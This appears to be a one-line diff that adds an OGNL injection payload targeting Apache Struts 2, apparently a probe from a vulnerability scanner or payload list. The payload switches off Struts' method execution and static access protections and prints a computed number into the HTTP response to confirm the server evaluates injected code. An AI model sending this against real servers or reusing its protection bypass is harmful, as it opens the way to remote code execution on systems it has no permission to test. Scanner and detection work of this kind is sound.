@@ -1,0 +1,1 @@
+# (#context["xwork.MethodAccessor.denyMethodExecution"]=new java.lang.Boolean(false),#_memberAccess["allowStaticMethodAccess"]=true,#x=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#x.println(42896*43529),#x.close())(meh)
